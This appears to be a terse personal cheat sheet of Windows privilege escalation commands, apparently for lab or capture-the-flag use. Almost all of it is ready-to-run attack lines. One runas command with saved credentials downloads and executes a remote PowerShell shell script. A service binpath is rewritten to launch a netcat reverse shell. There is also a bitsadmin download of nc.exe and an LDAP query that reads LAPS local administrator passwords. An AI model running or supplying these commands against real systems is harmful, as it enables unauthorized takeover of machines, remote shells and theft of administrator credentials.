Windows privilge escalation notes

- saved credentials
    cmdkey /list
    runas /user:XXX /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.x.x/shell.ps1')"

- weak service permission
    accesschk.exe -uwcqv "username" * -accepteula
    sc config [service_name] binpath= "C:\xxx\nc.exe -nv [LHOST] [LPORT] -e C:\WINDOWS\System32\cmd.exe"

- scheduled tasks
    schtasks /query /fo LIST /v

- transfer files
    bitsadmin /transfer somename http://10.10.16.3:8000/nc.exe nc.exe

- powershell Command history

- read LAPS attrbutes
ldapsearch -x -H "ldap://DC_IP"  -D "USER@DOMAIN.LOCAL" -W  -b "dc=DOMAIN,dc=LOCAL" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))"
